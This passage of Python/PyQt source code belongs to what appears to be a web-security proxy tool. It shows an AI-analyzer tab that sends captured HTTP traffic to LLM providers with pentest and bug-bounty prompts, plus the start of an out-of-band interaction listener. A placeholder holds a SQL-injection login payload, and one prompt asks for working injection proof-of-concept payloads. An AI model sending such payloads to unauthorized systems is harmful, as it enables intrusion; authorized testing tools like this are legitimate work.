            path, _ = QFileDialog.getSaveFileName(
                self,"Export Report","kingception_analysis.txt","Text (*.txt);;All (*.*)")
            if path:
                open(path,'w',encoding='utf-8').write(self.an_report.toPlainText())
                self._log(f"Report exported: {path}")

        def _clear():
            for t2 in [self.an_tech,self.an_ep,self.an_params,
                       self.an_secrets,self.an_auth,self.an_cookies,self.an_attack]:
                t2.clear()
            self.an_report.clear()
            self.an_status.setText("Cleared")
            self.an_prog.setValue(0)

        self.an_host_combo.currentIndexChanged.connect(
            lambda i: self.an_target.setText(
                "" if i == 0 else self.an_host_combo.currentText()))
        an_run.clicked.connect(_run)
        an_clr.clicked.connect(_clear)
        an_exp.clicked.connect(_export_html)
        an_exp_txt.clicked.connect(_export_text)
        return w

    def _ai_analyzer_tab(self):
        """AI-powered security analysis using Claude API — upgraded."""
        w = QWidget()
        root = QVBoxLayout(w); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # ── Provider / API key bar ───────────────────────────────────────────
        key_bar = QWidget(); key_bar.setFixedHeight(36)
        key_bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        kl = QHBoxLayout(key_bar); kl.setContentsMargins(10,0,10,0); kl.setSpacing(6)

        AI_PROVIDERS = {
            "Ollama (Local, Free)": {
                "endpoint": "http://localhost:11434",
                "models": ["llama3.1", "llama3.2", "mistral", "qwen2.5", "deepseek-r1"],
                "needs_key": False,
                "hint": "Free, runs on your machine, no signup, no data leaves your PC. "
                        "Install: ollama.com → 'ollama pull llama3.1' → 'ollama serve'.",
            },
            "Groq (Free Tier)": {
                "endpoint": "https://api.groq.com/openai/v1",
                "models": ["llama-3.3-70b-versatile", "llama-3.1-8b-instant", "mixtral-8x7b-32768"],
                "needs_key": True,
                "hint": "Free tier, needs a free API key from console.groq.com — very fast inference.",
            },
            "OpenRouter (Free Models)": {
                "endpoint": "https://openrouter.ai/api/v1",
                "models": ["meta-llama/llama-3.1-8b-instruct:free",
                           "google/gemma-2-9b-it:free", "mistralai/mistral-7b-instruct:free"],
                "needs_key": True,
                "hint": "Free-tagged models, needs a free API key from openrouter.ai.",
            },
            "Custom (OpenAI-compatible)": {
                "endpoint": "http://localhost:1234/v1",
                "models": ["local-model"],
                "needs_key": False,
                "hint": "Any OpenAI-compatible server: LM Studio, vLLM, text-generation-webui, etc.",
            },
            "Anthropic (Claude)": {
                "endpoint": "https://api.anthropic.com",
                "models": ["claude-sonnet-4-6", "claude-opus-4-6", "claude-haiku-4-5-20251001"],
                "needs_key": True,
                "hint": "Paid API — needs a key from console.anthropic.com.",
            },
        }
        self.AI_PROVIDERS = AI_PROVIDERS

        kl.addWidget(QLabel("Provider:"))
        self.ai_provider_combo = QComboBox()
        self.ai_provider_combo.addItems(list(AI_PROVIDERS.keys()))
        self.ai_provider_combo.setFixedHeight(24)
        self.ai_provider_combo.setToolTip(AI_PROVIDERS["Ollama (Local, Free)"]["hint"])
        kl.addWidget(self.ai_provider_combo)

        kl.addWidget(QLabel("Endpoint:"))
        self.ai_endpoint_edit = QLineEdit(AI_PROVIDERS["Ollama (Local, Free)"]["endpoint"])
        self.ai_endpoint_edit.setFixedHeight(24)
        kl.addWidget(self.ai_endpoint_edit, 1)

        kl.addWidget(QLabel("Key:"))
        self.ai_api_key = QLineEdit()
        self.ai_api_key.setEchoMode(QLineEdit.EchoMode.Password)
        self.ai_api_key.setPlaceholderText("only if the provider needs one — memory only, never saved to disk")
        self.ai_api_key.setFixedHeight(24)
        self.ai_api_key.setEnabled(False)   # Ollama (the default) needs no key
        kl.addWidget(self.ai_api_key, 1)

        self.ai_model_combo = QComboBox()
        self.ai_model_combo.setEditable(True)
        self.ai_model_combo.addItems(AI_PROVIDERS["Ollama (Local, Free)"]["models"])
        self.ai_model_combo.setFixedHeight(24)
        kl.addWidget(QLabel("Model:"))
        kl.addWidget(self.ai_model_combo)
        ai_new_session = self._btn("↺ New Session", h=24)
        kl.addWidget(ai_new_session)
        root.addWidget(key_bar)

        def _on_provider_changed(name: str):
            cfg = AI_PROVIDERS.get(name)
            if not cfg:
                return
            self.ai_endpoint_edit.setText(cfg["endpoint"])
            self.ai_api_key.setEnabled(cfg["needs_key"])
            if not cfg["needs_key"]:
                self.ai_api_key.clear()
            self.ai_model_combo.clear()
            self.ai_model_combo.addItems(cfg["models"])
            self.ai_provider_combo.setToolTip(cfg["hint"])
            self.ai_status_l.setText(cfg["hint"])
        self.ai_provider_combo.currentTextChanged.connect(_on_provider_changed)

        # ── Mode / context bar ───────────────────────────────────────────────
        mode_bar = QWidget(); mode_bar.setFixedHeight(36)
        mode_bar.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        ml = QHBoxLayout(mode_bar); ml.setContentsMargins(10,0,10,0); ml.setSpacing(6)
        ml.addWidget(QLabel("Mode:"))
        self.ai_mode = QComboBox()
        self.ai_mode.addItems([
            "🔭 Recon Assistant",
            "🎯 Scan Triage & Prioritization",
            "✅ Finding Validation Helper",
            "📝 Bug Bounty Report Builder",
            "Full Security Audit",
            "OWASP Top 10 Check",
            "Auth & Session Analysis",
            "Input Validation / Injection",
            "Business Logic Review",
            "API Security Review",
            "CVE / Tech Fingerprint",
            "Threat Model",
            "Remediation Code Only",
            "Explain Like I'm a Dev",
            "Custom Prompt…",
        ])
        self.ai_mode.setFixedHeight(24)
        ml.addWidget(self.ai_mode, 1)
        ai_from_proxy = self._btn("📥 Load from Proxy", h=24)
        ai_from_proxy.setToolTip("Load the last selected Traffic/Intercept request into the input pane")
        ml.addWidget(ai_from_proxy)
        ai_from_analysis = self._btn("📥 Load from Analysis", h=24)
        ai_from_analysis.setToolTip("Load discovered endpoints, secrets, and tech stack from the Analysis tab")
        ml.addWidget(ai_from_analysis)
        ai_from_scanner = self._btn("📥 Load from Scanner", h=24)
        ai_from_scanner.setToolTip("Load Scanner findings into the input pane")
        ml.addWidget(ai_from_scanner)
        ml.addStretch()
        self.ai_token_lbl = QLabel("")
        self.ai_token_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO}")
        ml.addWidget(self.ai_token_lbl)
        root.addWidget(mode_bar)

        # ── Main split ───────────────────────────────────────────────────────
        sp = QSplitter(Qt.Orientation.Horizontal); sp.setHandleWidth(3)

        # Left: input
        inp_w = QWidget(); iv = QVBoxLayout(inp_w); iv.setContentsMargins(6,6,6,0); iv.setSpacing(4)
        iv.addWidget(QLabel("HTTP Traffic / Context:"))
        self.ai_input = QPlainTextEdit()
        self.ai_input.setFont(mono_font(10))
        self.ai_input.setPlaceholderText(
            "Paste any HTTP request and/or response here, or click\n"
            "'Load from Proxy' to pull in the last selected message.\n\n"
            "Example:\nPOST /api/login HTTP/1.1\nHost: target.com\n"
            "Content-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"' OR 1=1--\"}")
        HTTPHighlighter(self.ai_input.document())
        iv.addWidget(self.ai_input, 1)
        inp_char_lbl = QLabel("0 chars")
        inp_char_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px")
        self.ai_input.textChanged.connect(
            lambda: inp_char_lbl.setText(f"{len(self.ai_input.toPlainText())} chars"))
        iv.addWidget(inp_char_lbl)
        sp.addWidget(inp_w)

        # Right: conversation output
        out_w = QWidget(); ov = QVBoxLayout(out_w); ov.setContentsMargins(0,6,6,0); ov.setSpacing(0)
        ov.addWidget(QLabel("AI Analysis:"))
        self.ai_output = QPlainTextEdit(); self.ai_output.setReadOnly(True)
        self.ai_output.setFont(mono_font(10))
        self.ai_output.setPlaceholderText(
            "AI analysis appears here.\n\nYou can ask follow-up questions — "
            "the full conversation history is preserved in each request.")
        ov.addWidget(self.ai_output, 1)
        # Follow-up input strip
        fu_row = QHBoxLayout(); fu_row.setContentsMargins(0,4,0,0); fu_row.setSpacing(4)
        self.ai_followup = QLineEdit()
        self.ai_followup.setPlaceholderText("Ask a follow-up question…  (Enter to send)")
        self.ai_followup.setFixedHeight(26)
        fu_send = self._btn("Send", "primary", h=26)
        fu_row.addWidget(self.ai_followup, 1); fu_row.addWidget(fu_send)
        ov.addLayout(fu_row)
        sp.addWidget(out_w)
        sp.setSizes([480, 600])
        root.addWidget(sp, 1)

        # ── Bottom action bar ────────────────────────────────────────────────
        bb = QWidget(); bb.setFixedHeight(40)
        bb.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};")
        bl = QHBoxLayout(bb); bl.setContentsMargins(8,0,8,0); bl.setSpacing(6)
        self.ai_run_btn   = self._btn("⚡ Analyse", "primary", h=28)
        ai_clear_btn      = self._btn("🗑 Clear All", "danger", h=28)
        ai_copy_md_btn    = self._btn("📋 Copy MD", h=28)
        ai_copy_md_btn.setToolTip("Copy full analysis as Markdown")
        ai_save_btn       = self._btn("💾 Save Report", h=28)
        self.ai_status_l  = QLabel("")
        self.ai_status_l.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        bl.addWidget(self.ai_run_btn); bl.addWidget(ai_clear_btn)
        bl.addWidget(ai_copy_md_btn); bl.addWidget(ai_save_btn)
        bl.addStretch(); bl.addWidget(self.ai_status_l)
        root.addWidget(bb)

        # ── Conversation history ─────────────────────────────────────────────
        self._ai_history: List[dict] = []   # [{role, content}]

        PROMPTS = {
            "🔭 Recon Assistant": (
                "You are helping triage reconnaissance data gathered by this tool's own Analysis "
                "tab (endpoints, technologies, and potential secrets found in traffic that was "
                "actually observed — you are not being asked to guess at things that weren't "
                "observed). Given this data:\n"
                "• Rank the discovered endpoints by how promising they look for further manual "
                "testing, and say why (auth-related, ID/parameter-heavy, admin-sounding, "
                "file/upload-related, etc.)\n"
                "• For each identified technology, note any well-known weak points or "
                "misconfiguration classes worth checking for that stack specifically\n"
                "• Flag anything in the 'secrets' list that looks worth investigating first\n"
                "• Suggest 5-10 concrete next manual-testing steps, most valuable first\n"
                "Be explicit about what's inferred vs. directly observed. Do not claim a "
                "vulnerability is confirmed from recon data alone.\n\nRecon data:\n"),
            "🎯 Scan Triage & Prioritization": (
                "You are triaging automated scanner findings from this tool's own Scanner tab. "
                "Given this list of findings:\n"
                "• Group/deduplicate findings that are really the same underlying issue\n"
                "• Re-rank by realistic exploitability and likely bounty value — not just the "
                "raw CVSS score, which automated scanners often over- or under-state\n"
                "• Flag findings that look like probable false positives, and say why\n"
                "• Pick the 3-5 findings most worth manually verifying first, in order\n"
                "Be honest about uncertainty — a scanner match is a lead to verify, not a "
                "confirmed vulnerability. Don't present anything as confirmed that hasn't "
                "actually been manually validated.\n\nScanner findings:\n"),
            "✅ Finding Validation Helper": (
                "You are helping validate ONE specific potential finding before it's reported. "
                "Given the evidence below:\n"
                "• State your honest confidence level (Confirmed / Likely / Possible / Probably "
                "a false positive) and explain exactly why, citing the specific evidence\n"
                "• List what additional evidence would move this from 'possible' to 'confirmed'\n"
                "• Write a specific, step-by-step manual test plan the researcher should actually "
                "perform to confirm it themselves (exact requests to send, exact things to check "
                "in the response) — you cannot send requests yourself, so give a plan a human can "
                "execute in Repeater\n"
                "• Note any way this could be a false positive (WAF quirk, honeypot behavior, "
                "expected behavior misread as a bug, etc.)\n\nFinding & evidence:\n"),
            "📝 Bug Bounty Report Builder": (
                "You are writing a bug bounty report for a CONFIRMED finding (the researcher has "
                "already manually verified this — write it up as confirmed, not as a maybe). "
                "Produce a submission-ready report in this structure:\n"
                "## Title\n(concise, specific — not generic)\n"
                "## Summary\n(2-3 sentences)\n"
                "## Severity\n(rating + CVSS v3.1 vector and score)\n"
                "## Steps to Reproduce\n(numbered, exact — a triager should be able to follow "
                "these with zero guessing)\n"
                "## Proof of Concept\n(exact request/response evidence, payloads used)\n"
                "## Impact\n(concrete, realistic — what a real attacker could actually do with this, "
                "not worst-case speculation)\n"
                "## Suggested Fix\n(specific and actionable)\n"
                "Write it the way an experienced, credible researcher would — precise, evidence-"
                "backed, no exaggeration. Overclaiming impact is one of the fastest ways to get a "
                "report downgraded or rejected by a triager.\n\nFinding, evidence, and any notes:\n"),
            "Full Security Audit": (
                "You are a senior penetration tester. Perform a comprehensive security audit "
                "of the following HTTP traffic. For every finding provide:\n"
                "• Vulnerability name and OWASP/CWE category\n"
                "• Severity: Critical / High / Medium / Low / Info\n"
                "• CVSS v3.1 score\n"
                "• Exact evidence from the request/response\n"
                "• Step-by-step reproduction steps\n"
                "• Remediation with code examples\n\n"
                "Use clear Markdown headings. HTTP Traffic:\n"),
            "OWASP Top 10 Check": (
                "Analyse this HTTP traffic against OWASP Top 10 2021 (A01–A10). "
                "For each category write: ✅ Safe / ⚠ Possible / ❌ Vulnerable — with brief evidence. "
                "End with a prioritised remediation list.\n\nHTTP Traffic:\n"),
            "Auth & Session Analysis": (
                "You are an expert in authentication and session management security. "
                "Analyse the traffic for: weak/guessable tokens, missing HttpOnly/Secure cookie flags, "
                "session fixation, CSRF, improper logout, JWT weaknesses (alg:none, weak secret, "
                "missing exp), OAuth/OIDC flaws, broken password policies.\n\nHTTP Traffic:\n"),
            "Input Validation / Injection": (
                "Check ALL input vectors for injection vulnerabilities: SQLi (error, blind, time-based), "
                "XSS (reflected, stored, DOM), SSTI, XXE, SSRF, OS command injection, path traversal, "
                "deserialization. Provide working PoC payloads for any confirmed or suspected issues.\n\nHTTP Traffic:\n"),
            "Business Logic Review": (
                "Review for business logic vulnerabilities: price/quantity manipulation, IDOR "
                "(horizontal & vertical), privilege escalation, workflow bypass, race conditions, "
                "mass assignment, account takeover chains.\n\nHTTP Traffic:\n"),
            "API Security Review": (
                "Review against OWASP API Security Top 10 2023. Check: broken object-level auth, "
                "broken auth, excessive data exposure, lack of rate limiting, broken function-level auth, "
                "mass assignment, security misconfiguration, injection, improper asset management, "
                "insufficient logging.\n\nHTTP Traffic:\n"),
            "CVE / Tech Fingerprint": (
                "Identify the complete technology stack from headers, cookies, error messages, "
                "and response patterns. For each identified component, list known CVEs (with CVSS, "
                "exploit availability, and patch version). Format as a table.\n\nHTTP Traffic:\n"),
            "Threat Model": (
                "You are a threat modelling expert using STRIDE. Analyse the HTTP traffic and produce "
                "a STRIDE threat model: Spoofing, Tampering, Repudiation, Information Disclosure, "
                "Denial of Service, Elevation of Privilege. For each threat give likelihood, impact, "
                "and mitigation.\n\nHTTP Traffic:\n"),
            "Remediation Code Only": (
                "Identify security issues in this HTTP traffic, then provide ONLY specific, "
                "copy-paste-ready remediation code (Python, Node.js, Java, or the most likely stack). "
                "No explanations — just the fixed code with inline comments.\n\nHTTP Traffic:\n"),
            "Explain Like I'm a Dev": (
                "Explain the security issues in this HTTP traffic in plain English, as if talking "
                "to a developer who isn't a security expert. Avoid jargon. Use analogies. "
                "Focus on what could go wrong and how easy the fix is.\n\nHTTP Traffic:\n"),
        }

        def _build_prompt(text: str) -> str:
            mode = self.ai_mode.currentText()
            if mode == "Custom Prompt…":
                custom, ok = QInputDialog.getMultiLineText(
                    w, "Custom Prompt", "Enter your prompt (HTTP traffic will be appended):",
                    "Analyse this HTTP traffic for security issues:\n")
                if not ok or not custom.strip():
                    return ""
                return custom.strip() + "\n\nHTTP Traffic:\n" + text
            return PROMPTS.get(mode, PROMPTS["Full Security Audit"]) + text

        AI_SYSTEM_PROMPT = (
            "You are Kingception AI — an expert penetration tester and security researcher "
            "embedded in a security proxy tool, helping with authorized testing (bug bounty "
            "programs, pentests, and other testing you have permission to do). You give "
            "precise, actionable, technically detailed security analysis grounded only in "
            "the evidence you're given — never invent findings, endpoints, or evidence that "
            "isn't in the input. Format with Markdown. Where relevant include: severity, CWE, "
            "CVSS score, exact evidence, reproduction steps, and remediation. When you're not "
            "certain something is exploitable, say so and describe what would need to be "
            "checked manually rather than asserting it's confirmed."
        )
        self.AI_SYSTEM_PROMPT = AI_SYSTEM_PROMPT

        def _call_api(messages: list) -> str:
            import urllib.request as _ur, urllib.error as _ue, json as _j
            provider = self.ai_provider_combo.currentText()
            cfg = AI_PROVIDERS.get(provider, {})
            endpoint = self.ai_endpoint_edit.text().strip().rstrip('/')
            model = self.ai_model_combo.currentText().strip()
            api_key = self.ai_api_key.text().strip()
            if not endpoint:
                return "❌ No endpoint set for this provider."
            if cfg.get("needs_key") and not api_key:
                return (f"❌ {provider} needs an API key.\n\n"
                        f"Enter it in the Key field at the top of this tab.\n{cfg.get('hint','')}")
            try:
                if provider.startswith("Ollama"):
                    payload = {
                        "model": model, "stream": False,
                        "messages": [{"role": "system", "content": AI_SYSTEM_PROMPT}] + messages,
                    }
                    url = f"{endpoint}/api/chat"
                    headers = {"content-type": "application/json"}
                elif provider.startswith("Anthropic"):
                    payload = {
                        "model": model, "max_tokens": 4096,
                        "messages": messages, "system": AI_SYSTEM_PROMPT,
                    }
                    url = f"{endpoint}/v1/messages"
                    headers = {"content-type": "application/json",
                               "anthropic-version": "2023-06-01", "x-api-key": api_key}
                else:
                    # Groq / OpenRouter / Custom — all OpenAI-compatible
                    payload = {
                        "model": model,
                        "messages": [{"role": "system", "content": AI_SYSTEM_PROMPT}] + messages,
                    }
                    url = f"{endpoint}/chat/completions"
                    headers = {"content-type": "application/json"}
                    if api_key:
                        headers["authorization"] = f"Bearer {api_key}"

                req = _ur.Request(url, data=_j.dumps(payload).encode(), headers=headers)
                resp = _ur.urlopen(req, timeout=180)
                result = _j.loads(resp.read())

                if provider.startswith("Ollama"):
                    return result.get("message", {}).get("content", "") or "❌ Empty response from Ollama."
                elif provider.startswith("Anthropic"):
                    return result['content'][0]['text']
                else:
                    return result['choices'][0]['message']['content']

            except _ue.URLError as ex:
                if provider.startswith("Ollama") and "Connection refused" in str(ex):
                    return ("❌ Can't reach Ollama at " + endpoint + "\n\n"
                            "Ollama isn't running. Install it from ollama.com, then in a "
                            "terminal run:\n  ollama pull " + (model or "llama3.1") +
                            "\n  ollama serve\n\nThen try again.")
                return f"❌ Can't reach {endpoint} — {ex}"
            except _ue.HTTPError as ex:
                body = ""
                try:
                    body = ex.read().decode('utf-8', 'replace')[:300]
                except Exception:
                    pass
                if ex.code == 401:
                    return f"❌ Authentication failed — check your {provider} API key.\n{body}"
                if ex.code == 429:
                    return f"❌ Rate limited by {provider} — wait a moment and retry.\n{body}"
                if ex.code == 404 and model and provider.startswith("Ollama"):
                    return (f"❌ Model '{model}' not found on this Ollama install.\n\n"
                            f"Pull it first:  ollama pull {model}")
                return f"❌ {provider} error {ex.code}: {body or ex}"
            except Exception as ex:
                return f"❌ Error calling {provider}: {ex}"

        def _submit(follow_up: str = ""):
            traffic_text = self.ai_input.toPlainText().strip()
            if follow_up:
                # Follow-up: add user message to existing history
                if not self._ai_history:
                    self.ai_status_l.setText("⚠ Run an initial analysis first")
                    return
                user_msg = follow_up.strip()
                self._ai_history.append({"role": "user", "content": user_msg})
            else:
                if not traffic_text:
                    self.ai_output.setPlainText("⚠ Paste some HTTP traffic in the left pane first.")
                    return
                prompt = _build_prompt(traffic_text)
                if not prompt:
                    return
                self._ai_history = [{"role": "user", "content": prompt}]
                self.ai_output.clear()

            self.ai_run_btn.setEnabled(False)
            fu_send.setEnabled(False)
            self.ai_status_l.setText("⏳ Waiting for AI…")
            if not follow_up:
                self.ai_output.setPlainText("⏳ Analysing…")

            fut = self._thread_pool.submit(_call_api, list(self._ai_history))
            chars_shown = [0]

            def _poll():
                if fut.done():
                    self.ai_run_btn.setEnabled(True)
                    fu_send.setEnabled(True)
                    result = fut.result()
                    self._ai_history.append({"role": "assistant", "content": result})
                    # Render full conversation
                    _render_history()
                    n_tok = len(result.split())
                    total_turns = len([m for m in self._ai_history if m["role"]=="assistant"])
                    self.ai_status_l.setText(
                        f"✅ Done · ~{n_tok} words · {total_turns} turn(s)")
                    self.ai_token_lbl.setText(
                        f"{sum(len(m['content'].split()) for m in self._ai_history)} words in session")
                    self._log(f"[AI] {self.ai_mode.currentText()} · {n_tok} words")
                    self.ai_followup.clear()
                else:
                    # Animate dots while waiting
                    dots = "." * ((chars_shown[0] % 4) + 1)
                    chars_shown[0] += 1
                    if not fut.done():
                        self.ai_status_l.setText(f"⏳ Thinking{dots}")
                    QTimer.singleShot(300, _poll)
            QTimer.singleShot(300, _poll)

        def _render_history():
            """Re-render the full conversation into the output pane."""
            lines = []
            for i, msg in enumerate(self._ai_history):
                role = msg["role"]
                content = msg["content"]
                if role == "user" and i == 0:
                    # First user message: show the mode, not the full prompt
                    lines.append(f"{'─'*60}")
                    lines.append(f"MODE: {self.ai_mode.currentText()}")
                    lines.append(f"{'─'*60}\n")
                elif role == "user":
                    lines.append(f"\n{'─'*60}")
                    lines.append(f"YOU: {content}")
                    lines.append(f"{'─'*60}\n")
                else:
                    lines.append(content)
                    lines.append("")
            self.ai_output.setPlainText("\n".join(lines))
            # Scroll to bottom
            self.ai_output.moveCursor(self.ai_output.textCursor().MoveOperation.End)

        def _load_from_proxy():
            if self._cur_req_pi is None:
                # Try most recent traffic message
                msgs = list(self.db.recent)
                if not msgs:
                    QMessageBox.information(w, "Load from Proxy",
                        "No traffic captured yet. Browse some pages through the proxy first.")
                    return
                msg = msgs[-1]
                rh  = msg.get("req_headers") or {}
                rb  = decode_body(msg.get("req_body",""))
                meth = msg.get("method","GET")
                path = msg.get("path","/")
                host = msg.get("host","")
                text = f"{meth} {path} HTTP/1.1\nHost: {host}\n"
                for k, v in rh.items():
                    text += f"{k}: {v}\n"
                if rb: text += f"\n{rb}"
                sh = msg.get("resp_headers") or {}
                rb2 = decode_body(msg.get("resp_body",""))
                text += f"\n\n{'─'*40} RESPONSE {'─'*40}\n"
                text += f"HTTP/1.1 {msg.get('status',0)}\n"
                for k, v in sh.items():
                    text += f"{k}: {v}\n"
                if rb2: text += f"\n{rb2[:4000]}"
                self.ai_input.setPlainText(text)
            else:
                # Use the currently selected intercept request
                self.ai_input.setPlainText(self.ic_editor.toPlainText())

        def _load_from_analysis():
            if not hasattr(self, 'an_ep') or not hasattr(self, 'an_secrets'):
                QMessageBox.information(w, "Load from Analysis",
                    "The Analysis tab hasn't been opened yet this session.\n\n"
                    "Open the 📊 Analysis tab and run a scan there first, then come back here.")
                return
            n_ep = self.an_ep.topLevelItemCount()
            n_sec = self.an_secrets.topLevelItemCount()
            if n_ep == 0 and n_sec == 0:
                QMessageBox.information(w, "Load from Analysis",
                    "No recon data yet. Run analysis on some captured traffic in the "
                    "📊 Analysis tab first, then come back here.")
                return
            lines = [f"=== Endpoints ({n_ep}) ==="]
            for i in range(n_ep):
                it = self.an_ep.topLevelItem(i)
                lines.append(f"{it.text(0):6s} {it.text(1):50s} status={it.text(2)} "
                             f"auth={it.text(3)} type={it.text(4)} notes={it.text(6)}")
            lines.append(f"\n=== Potential secrets ({n_sec}) ===")
            for i in range(n_sec):
                it = self.an_secrets.topLevelItem(i)
                lines.append(f"{it.text(0):15s} location={it.text(2)} risk={it.text(3)} url={it.text(4)}")
            if hasattr(self, 'an_report'):
                report_text = self.an_report.toPlainText().strip()
                if report_text:
                    lines.append(f"\n=== Full analysis notes ===\n{report_text}")
            self.ai_input.setPlainText("\n".join(lines))
            if self.ai_mode.currentText() not in ("🔭 Recon Assistant",):
                self.ai_mode.setCurrentText("🔭 Recon Assistant")

        def _load_from_scanner():
            findings = getattr(self, '_scan_findings', None) or []
            if not findings:
                QMessageBox.information(w, "Load from Scanner",
                    "No Scanner findings yet. Run a scan in the 🎯 Scanner tab first, "
                    "then come back here.")
                return
            lines = [f"=== Scanner findings ({len(findings)}) ==="]
            for i, r in enumerate(findings, 1):
                lines.append(
                    f"\n[{i}] {r.get('severity','').upper()} — {r.get('vuln_type','')}\n"
                    f"    URL: {r.get('url','')}\n"
                    f"    CWE: {r.get('cwe','')}  CVSS: {r.get('cvss','')}\n"
                    f"    Description: {r.get('desc','')}")
                if r.get('req_ev'):
                    lines.append(f"    Request evidence:  {str(r.get('req_ev'))[:400]}")
                if r.get('resp_ev'):
                    lines.append(f"    Response evidence: {str(r.get('resp_ev'))[:400]}")
            self.ai_input.setPlainText("\n".join(lines))
            if self.ai_mode.currentText() not in ("🎯 Scan Triage & Prioritization",):
                self.ai_mode.setCurrentText("🎯 Scan Triage & Prioritization")

        def _clear_all():
            self.ai_input.clear()
            self.ai_output.clear()
            self._ai_history.clear()
            self.ai_status_l.setText("")
            self.ai_token_lbl.setText("")

        def _copy_markdown():
            lines = []
            for i, msg in enumerate(self._ai_history):
                if msg["role"] == "assistant":
                    lines.append(msg["content"])
                    lines.append("")
            if not lines:
                lines = [self.ai_output.toPlainText()]
            QApplication.clipboard().setText("\n".join(lines))
            self.ai_status_l.setText("✅ Copied as Markdown")

        def _save_report():
            path, _ = QFileDialog.getSaveFileName(
                w, "Save AI Report", "ai_security_report.md", "Markdown (*.md);;Text (*.txt)")
            if path:
                lines = []
                lines.append("# Kingception AI Security Report\n")
                lines.append(f"**Mode:** {self.ai_mode.currentText()}  ")
                lines.append(f"**Date:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
                lines.append("---\n")
                for msg in self._ai_history:
                    if msg["role"] == "assistant":
                        lines.append(msg["content"])
                        lines.append("\n---\n")
                open(path, "w", encoding="utf-8").write("\n".join(lines))
                self._log(f"[AI] Report saved: {path}")

        # Wire signals
        self.ai_run_btn.clicked.connect(lambda: _submit())
        self.ai_followup.returnPressed.connect(lambda: _submit(self.ai_followup.text()))
        fu_send.clicked.connect(lambda: _submit(self.ai_followup.text()))
        ai_clear_btn.clicked.connect(_clear_all)
        ai_copy_md_btn.clicked.connect(_copy_markdown)
        ai_save_btn.clicked.connect(_save_report)
        ai_from_proxy.clicked.connect(_load_from_proxy)
        ai_from_analysis.clicked.connect(_load_from_analysis)
        ai_from_scanner.clicked.connect(_load_from_scanner)
        ai_new_session.clicked.connect(lambda: (
            self._ai_history.clear(),
            self.ai_output.clear(),
            self.ai_status_l.setText("Session reset"),
            self.ai_token_lbl.setText(""),
        ))

        return w

    # ---------- Collaborator ----------
    def _collaborator_tab(self):
        """Self-hosted OOB (out-of-band) interaction listener — generates
        unique interaction IDs and shows any HTTP/DNS hit against them."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        info = QLabel(
            "🌐 <b>Self-hosted OOB listener</b> — not a public service. Generates unique "
            "interaction IDs and logs any HTTP or DNS hit against them. For a target app to "
            "reach this, it must be able to route here: same host/LAN, or point your own "
            "domain/tunnel (ngrok, Cloudflare Tunnel, a VPS with a wildcard DNS record) at "
            "this machine and set that as the Public Host below.")
        info.setTextFormat(Qt.TextFormat.RichText)
        info.setWordWrap(True)
        info.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT2};padding:10px 14px;"
            f"font-size:11px;border-bottom:1px solid {T.BORDER};")
        root.addWidget(info)

        # ── Control bar ──────────────────────────────────────────────────
        ctl = QWidget()
        ctl.setFixedHeight(44)
        ctl.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        cl = QHBoxLayout(ctl)
        cl.setContentsMargins(10, 0, 10, 0)
        cl.setSpacing(6)
        cl.addWidget(QLabel("Public host:"))
        self.collab_host = QLineEdit(self._collab_public_host if hasattr(self, '_collab_public_host') else "127.0.0.1")
        self.collab_host.setFixedHeight(28)
        self.collab_host.setFixedWidth(160)
        self.collab_host.setToolTip("Your own domain/tunnel host, or 127.0.0.1 for local-only testing")
        cl.addWidget(self.collab_host)
        cl.addWidget(QLabel("HTTP port:"))
        self.collab_http_port = QSpinBox()
        self.collab_http_port.setRange(1, 65535)
        self.collab_http_port.setValue(self._collab.http_port)
        self.collab_http_port.setFixedHeight(28)
        cl.addWidget(self.collab_http_port)
        cl.addWidget(QLabel("DNS port:"))
        self.collab_dns_port = QSpinBox()
        self.collab_dns_port.setRange(1, 65535)
        self.collab_dns_port.setValue(self._collab.dns_port)
        self.collab_dns_port.setFixedHeight(28)
        self.collab_dns_port.setToolTip("53 needs admin/root privileges on most systems — try 5353+ instead")
        cl.addWidget(self.collab_dns_port)
        self.collab_start_btn = self._btn("▶ Start Listener", "primary", h=28)
        self.collab_stop_btn = self._btn("⏹ Stop", "danger", h=28)
        self.collab_stop_btn.setEnabled(self._collab.running)
        self.collab_start_btn.setEnabled(not self._collab.running)
        cl.addWidget(self.collab_start_btn)
        cl.addWidget(self.collab_stop_btn)
        cl.addStretch()
        self.collab_status_lbl = QLabel("● Running" if self._collab.running else "● Stopped")
        self.collab_status_lbl.setStyleSheet(
            f"color:{T.GREEN if self._collab.running else T.TXT3};font-size:11px;font-weight:600;")
        cl.addWidget(self.collab_status_lbl)
        root.addWidget(ctl)

        # ── Generate-payload row ─────────────────────────────────────────
        gen_row = QWidget()
        gen_row.setFixedHeight(40)
        gen_row.setStyleSheet(f"background:{T.SURFACE};border-bottom:1px solid {T.BORDER};")
        gl = QHBoxLayout(gen_row)
        gl.setContentsMargins(10, 0, 10, 0)
        gl.setSpacing(6)
        self.collab_label_edit = QLineEdit()
        self.collab_label_edit.setPlaceholderText("Label — e.g. SSRF test on /api/fetch")
        self.collab_label_edit.setFixedHeight(28)
        self.collab_gen_btn = self._btn("⚡ Generate Payload", "purple", h=28)
        gl.addWidget(self.collab_label_edit, 1)
        gl.addWidget(self.collab_gen_btn)
        root.addWidget(gen_row)

        # ── Main split: payloads (left) | interaction log (right) ─────────
        sp = QSplitter(Qt.Orientation.Horizontal)
        sp.setHandleWidth(2)

        pay_w = QWidget()
        pv = QVBoxLayout(pay_w)
        pv.setContentsMargins(0, 0, 0, 0)
        pv.addWidget(self._section_header("Generated Payloads"))
        self.collab_payloads_tbl = QTableWidget(0, 3)
        self.collab_payloads_tbl.setHorizontalHeaderLabels(["Label", "Interaction ID", "Hits"])
        self.collab_payloads_tbl.horizontalHeader().setStretchLastSection(False)
        self.collab_payloads_tbl.setColumnWidth(0, 190)
